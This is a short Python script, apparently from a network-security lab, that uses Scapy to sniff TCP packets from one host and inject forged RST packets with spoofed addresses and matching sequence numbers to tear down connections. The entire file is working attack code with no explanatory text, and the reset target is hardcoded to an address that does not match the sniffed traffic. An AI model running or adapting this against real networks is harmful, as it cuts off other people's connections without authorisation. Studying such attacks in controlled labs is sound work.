#!/bin/python3
from scapy.all import *
import sys

strSourceIP = "10.9.0.1"
strDestinationIP = "10.9.0.5"

def spoof_tcp(pkt):

    lyrIP = IP(dst = "10.0.2.15", src = pkt[IP].dst)
    lyrTCP = TCP(flags="R", seq=pkt[TCP].ack, dport=pkt[TCP].sport, sport=pkt[TCP].dport)
    
    # Build the spoofed packet
    pktSpoofedPacket = lyrIP / lyrTCP
    
    # Send the spoofed packet
    send(pktSpoofedPacket, verbose=0)

pkt = sniff(filter='tcp and src host {}'.format(strSourceIP),
            prn=spoof_tcp)